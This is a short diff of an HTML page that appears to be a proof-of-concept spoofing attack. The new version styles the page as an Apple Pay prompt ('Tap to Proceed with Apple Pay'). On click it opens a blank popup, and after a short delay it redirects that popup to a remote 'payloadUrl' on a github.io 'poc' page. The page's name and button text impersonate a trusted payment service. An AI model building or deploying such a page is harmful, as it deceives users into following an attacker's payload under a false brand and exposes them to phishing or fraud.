@@ -1,17 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head><title>Launching Secure Session</title></head>
-<body>
-<script>
-  const win = window.open('about:blank', '_blank');
+<head><title>Secure Session Start</title></head>
+<body style="font-family: -apple-system; display:flex; justify-content:center; align-items:center; height:100vh; background:#f2f2f7;">
+  <a href="about:blank" target="_blank" onclick="launch(event)" style="font-size:20px; text-decoration:none; color:#007aff; border:1px solid #007aff; padding:12px 20px; border-radius:12px;">
+    🔐 Tap to Proceed with Apple Pay
+  </a>
 
-  setTimeout(() => {
-    if (win) {
-      win.location.replace("https://sauceialist.github.io/poc/index.html");
-    } else {
-      alert("Please enable pop-ups to continue.");
+  <script>
+    function launch(e) {
+      const popup = window.open('about:blank', '_blank');
+      e.preventDefault(); // prevent default navigation from anchor
+
+      const payloadUrl = "https://sauceialist.github.io/poc/index.html";
+
+      setTimeout(() => {
+        if (popup) {
+          popup.location.replace(payloadUrl);
+        } else {
+          alert("Pop-up blocked. Try again.");
+        }
+      }, 100);
     }
-  }, 200);
-</script>
+  </script>
 </body>
 </html>
